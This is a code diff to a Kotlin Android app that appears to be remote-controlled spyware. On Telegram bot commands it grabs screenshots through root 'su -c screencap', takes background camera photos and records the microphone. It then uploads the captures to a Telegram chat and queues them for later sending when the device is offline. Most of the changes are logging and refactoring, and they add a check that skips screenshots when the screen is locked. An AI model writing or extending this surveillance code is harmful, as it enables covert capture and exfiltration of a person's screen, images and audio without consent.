@@ -1,16 +1,20 @@
 package com.system.superiormonitor.monitor
 
+import com.system.superiormonitor.util.LogLevel
+
 import android.content.Context
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import com.system.superiormonitor.bot.TelegramApi
 import com.system.superiormonitor.util.LogCategory
 import com.system.superiormonitor.util.LogManager
+import android.app.KeyguardManager
 import android.media.AudioAttributes
 import android.media.AudioFocusRequest
 import android.media.AudioManager
 import android.media.MediaRecorder
 import android.os.Build
+import android.os.PowerManager
 import android.telephony.PhoneStateListener
 import android.telephony.TelephonyCallback
 import android.telephony.TelephonyManager
@@ -53,7 +57,7 @@ object MediaOperations {
                 replyMarkup = "{\"inline_keyboard\": []}"
             )
             
-            LogManager.log(LogCategory.MEDIA, "$tag Starting immediate capture...")
+            LogManager.log(LogCategory.SNAPSHOTS, "$tag Starting immediate capture...")
             
             val cacheDir = context.cacheDir
             val tempFile = when (type) {
@@ -67,6 +71,21 @@ object MediaOperations {
             
             try {
                 if (type == 0) {
+                    val keyguardManager = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
+                    val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
+                    val isLocked = keyguardManager.isKeyguardLocked
+                    val isScreenOn = powerManager.isInteractive
+
+                    if (isLocked || !isScreenOn) {
+                        LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture aborted: Screen is locked or off.")
+                        TelegramApi.editMessageText(
+                            botToken, chatId, messageId,
+                            com.system.superiormonitor.bot.BotMessages.Alerts.buildLockedScreenMessage(),
+                            replyMarkup = com.system.superiormonitor.bot.BotMarkups.Alerts.buildLockedScreenMarkup()
+                        )
+                        return@launch
+                    }
+
                     val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "screencap -p ${tempFile.absolutePath} && chmod 666 ${tempFile.absolutePath}"))
                     errorOutput = process.errorStream.bufferedReader().use { it.readText() }
                     if (process.waitFor() != 0) isSuccess = false
@@ -74,16 +93,16 @@ object MediaOperations {
                     val success = BackgroundCamera.capture(context, type, tempFile)
                     if (!success) {
                         isSuccess = false
-                        errorOutput = "Silent capture failed internally."
+                        errorOutput = "capture failed internally."
                     }
                 }
                 
                 if (!isSuccess || !tempFile.exists() || tempFile.length() == 0L) {
-                    LogManager.log(LogCategory.MEDIA, "$tag Capture failed. Error: $errorOutput")
+                    LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture failed. Error: $errorOutput", LogLevel.ERROR)
                     TelegramApi.editMessageText(
                         botToken, chatId, messageId,
                         "❌ *Capture Failed*\n\nReason: $errorOutput",
-                        replyMarkup = com.system.superiormonitor.bot.BotCommands.buildCaptureSuccessMarkup()
+                        replyMarkup = com.system.superiormonitor.bot.BotMarkups.MediaOps.buildCaptureSuccessMarkup()
                     )
                     return@launch
                 }
@@ -91,8 +110,8 @@ object MediaOperations {
                 val bitmap = BitmapFactory.decodeFile(tempFile.absolutePath)
                 if (bitmap == null) {
                     tempFile.delete()
-                    LogManager.log(LogCategory.MEDIA, "$tag Decode failed.")
-                    TelegramApi.editMessageText(botToken, chatId, messageId, "❌ *Capture Failed*\n\nReason: Decode error.", replyMarkup = com.system.superiormonitor.bot.BotCommands.buildCaptureSuccessMarkup())
+                    LogManager.log(LogCategory.SNAPSHOTS, "$tag Decode failed.", LogLevel.ERROR)
+                    TelegramApi.editMessageText(botToken, chatId, messageId, "❌ *Capture Failed*\n\nReason: Decode error.", replyMarkup = com.system.superiormonitor.bot.BotMarkups.MediaOps.buildCaptureSuccessMarkup())
                     return@launch
                 }
                 
@@ -104,37 +123,35 @@ object MediaOperations {
                 bitmap.recycle()
                 tempFile.delete()
                 
-                val caption = when (type) {
-                    0 -> "#Snapshot #OnDemand\n\n*Screen Capture Success*"
-                    1 -> "#Camera #OnDemand\n\n*Front Camera Success*"
-                    else -> "#Camera #OnDemand\n\n*Rear Camera Success*"
-                }
+                val caption = com.system.superiormonitor.bot.BotMessages.MediaOps.buildOnDemandCaptureMessage(type)
                 
                 // Upload photo
                 val uploaded = TelegramApi.sendPhoto(botToken, chatId, destFile, caption)
                 destFile.delete()
                 
                 if (uploaded) {
+                    LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture successfully uploaded.")
                     TelegramApi.editMessageText(
                         token = botToken,
                         chatId = chatId,
                         messageId = messageId,
                         text = "*The shot has been sent successfully*\n\n*Click below button to go back to the SnapShot Engine*",
-                        replyMarkup = com.system.superiormonitor.bot.BotCommands.buildCaptureSuccessMarkup()
+                        replyMarkup = com.system.superiormonitor.bot.BotMarkups.MediaOps.buildCaptureSuccessMarkup()
                     )
                 } else {
+                    LogManager.log(LogCategory.SNAPSHOTS, "$tag Upload failed.", LogLevel.ERROR)
                     TelegramApi.editMessageText(
                         botToken, chatId, messageId,
                         "❌ *Capture Failed*\n\nReason: Telegram API Upload Failed.",
-                        replyMarkup = com.system.superiormonitor.bot.BotCommands.buildCaptureSuccessMarkup()
+                        replyMarkup = com.system.superiormonitor.bot.BotMarkups.MediaOps.buildCaptureSuccessMarkup()
                     )
                 }
             } catch (e: Exception) {
-                LogManager.log(LogCategory.MEDIA, "$tag Exception: ${e.message}")
+                LogManager.log(LogCategory.SNAPSHOTS, "$tag Exception: ${e.message}", LogLevel.ERROR)
                 TelegramApi.editMessageText(
                     botToken, chatId, messageId,
                     "❌ *Capture Failed*\n\nReason: Exception occurred.",
-                    replyMarkup = com.system.superiormonitor.bot.BotCommands.buildCaptureSuccessMarkup()
+                    replyMarkup = com.system.superiormonitor.bot.BotMarkups.MediaOps.buildCaptureSuccessMarkup()
                 )
             }
         }
@@ -164,6 +181,7 @@ object MediaOperations {
 
                 // Telephony pre-check
                 if (telephonyManager.callState != TelephonyManager.CALL_STATE_IDLE) {
+                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Recording rejected: Phone call in progress.", LogLevel.ERROR)
                     TelegramApi.editMessageText(
                         botToken, chatId, messageId,
                         "❌ *Microphone is already in use or a call is in progress. Please wait for the activity to end.*" // Actually rejecting as requested
@@ -172,6 +190,7 @@ object MediaOperations {
                     return@launch
                 }
 
+                LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Waiting for Audio Focus...")
                 TelegramApi.editMessageText(
                     botToken, chatId, messageId,
                     "⏳ *Waiting for microphone to be free...*"
@@ -212,6 +231,7 @@ object MediaOperations {
                 }
 
                 if (!focusGained) {
+                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Failed to acquire Audio Focus after 1 minute.", LogLevel.ERROR)
                     TelegramApi.editMessageText(
                         botToken, chatId, messageId,
                         "❌ *Recording Failed*\n\nReason: Microphone could not be acquired after 1 minute."
@@ -220,6 +240,7 @@ object MediaOperations {
                     return@launch
                 }
 
+                LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Starting recording for ${durationMs / 1000}s...")
                 TelegramApi.editMessageText(
                     botToken, chatId, messageId,
                     "🎙️ *Starting recording...*"
@@ -262,6 +283,7 @@ object MediaOperations {
                         isRecordingActive = true
                     }
                 } catch (e: Exception) {
+                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Failed to start MediaRecorder: ${e.message}", LogLevel.ERROR)
                     TelegramApi.editMessageText(
                         botToken, chatId, messageId,
                         "❌ *Recording Failed*\n\nReason: Failed to start MediaRecorder. ${e.message}"
@@ -280,6 +302,7 @@ object MediaOperations {
                             AudioManager.AUDIOFOCUS_LOSS_TRANSIENT -> {
                                 if (isRecordingActive) {
                                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                                        LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Recording paused due to Audio Focus loss.")
                                         mediaRecorder?.pause()
                                         TelegramApi.editMessageText(botToken, chatId, messageId, "⏸️ *Recording Paused Due to : Audio Focus Loss*")
                                     } else {
@@ -289,11 +312,13 @@ object MediaOperations {
                             }
                             AudioManager.AUDIOFOCUS_GAIN -> {
                                 if (isRecordingActive && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Recording resumed.")
                                     mediaRecorder?.resume()
                                     TelegramApi.editMessageText(botToken, chatId, messageId, "🎙️ *Starting recording (Resumed)...*")
                                 }
                             }
                             AudioManager.AUDIOFOCUS_LOSS -> {
+                                LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Recording stopped due to permanent Audio Focus loss.", LogLevel.ERROR)
                                 recordingJob?.cancel() // Forcibly stop the recording
                                 TelegramApi.editMessageText(botToken, chatId, messageId, "🛑 *Recording Stopped Due To : Permanent Audio Focus Loss*")
                             }
@@ -320,6 +345,7 @@ object MediaOperations {
                             override fun onCallStateChanged(state: Int) {
                                 if (state != TelephonyManager.CALL_STATE_IDLE) {
                                     scope.launch(Dispatchers.IO) {
+                                        LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Recording stopped due to incoming/outgoing call.", LogLevel.ERROR)
                                         TelegramApi.editMessageText(botToken, chatId, messageId, "🛑 *Recording Stopped Due To : Incoming/Outgoing Call*")
                                         recordingJob?.cancel()
                                     }
@@ -333,6 +359,7 @@ object MediaOperations {
                             override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                                 if (state != TelephonyManager.CALL_STATE_IDLE) {
                                     scope.launch(Dispatchers.IO) {
+                                        LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Recording stopped due to incoming/outgoing call.", LogLevel.ERROR)
                                         TelegramApi.editMessageText(botToken, chatId, messageId, "🛑 *Recording Stopped Due To : Incoming/Outgoing Call*")
                                         recordingJob?.cancel()
                                     }
@@ -354,7 +381,7 @@ object MediaOperations {
                     isRecordingActive = false
                     mediaRecorder?.stop()
                 } catch (e: Exception) {
-                    // Ignored
+                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Error stopping recorder: ${e.message}", LogLevel.ERROR)
                 } finally {
                     mediaRecorder?.release()
                 }
@@ -374,7 +401,7 @@ object MediaOperations {
                         }
                     }
                 } catch (e: Exception) {
-                    // Ignore cleanup exceptions
+                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Error releasing resources: ${e.message}", LogLevel.ERROR)
                 }
                 
                 // Allow new recordings
@@ -387,6 +414,7 @@ object MediaOperations {
 
                 // Upload or Offline Sync
                 if (!outputFile.exists() || outputFile.length() == 0L) {
+                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Upload failed: File is empty or corrupt.", LogLevel.ERROR)
                     TelegramApi.editMessageText(
                         botToken, chatId, messageId,
                         "❌ *Audio Recording Failed*\n\nReason: File is empty or corrupt."
@@ -397,30 +425,30 @@ object MediaOperations {
                 if (TelegramApi.isApiReachable(context, botToken)) {
                     val uploaded = TelegramApi.sendDocument(botToken, chatId, outputFile, caption = "Microphone Recording")
                     if (uploaded) {
+                        LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Successfully uploaded recording.")
                         outputFile.delete()
                         TelegramApi.editMessageText(
                             botToken, chatId, messageId,
-                            "✅ *Recording Successfully Uploaded*\n\nThe recording has been completed. The file was saved to the device memory and sent to Telegram."
+                            "✅ *Recording Successfully Uploaded*\n\nThe recording has been completed. The file was deleted from device and sent to Telegram."
                         )
                     } else {
+                        LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Telegram upload failed. Moving to offline queue.", LogLevel.ERROR)
+                        com.system.superiormonitor.bot.OfflineManager.moveToOfflineQueue(context, outputFile, "mediaops", fileName)
                         TelegramApi.editMessageText(
                             botToken, chatId, messageId,
-                            "❌ *Audio Recording Failed*\n\nReason: Telegram API Upload Failed."
+                            "❌ *Audio Recording Failed*\n\nReason: Telegram API Upload Failed. File queued for offline sync."
                         )
                     }
                 } else {
-                    val offlineDir = File(context.getExternalFilesDir(null), "mediaops/offline")
-                    if (!offlineDir.exists()) offlineDir.mkdirs()
-                    val offlineFile = File(offlineDir, fileName)
-                    outputFile.copyTo(offlineFile, overwrite = true)
-                    outputFile.delete()
+                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Device offline. Moved recording to offline queue.")
+                    com.system.superiormonitor.bot.OfflineManager.moveToOfflineQueue(context, outputFile, "mediaops", fileName)
 
                     // Dropping the editMessageText because the device is offline and it will fail anyway.
                 }
 
             } catch (e: Exception) {
                 micMutex.withLock { isMicRecording = false }
-                LogManager.log(LogCategory.MEDIA, "[Microphone] Exception: ${e.message}")
+                LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Exception: ${e.message}", LogLevel.ERROR)
                 TelegramApi.editMessageText(
                     botToken, chatId, messageId,
                     "❌ *Audio Recording Failed*\n\nReason: Exception occurred. ${e.message}"
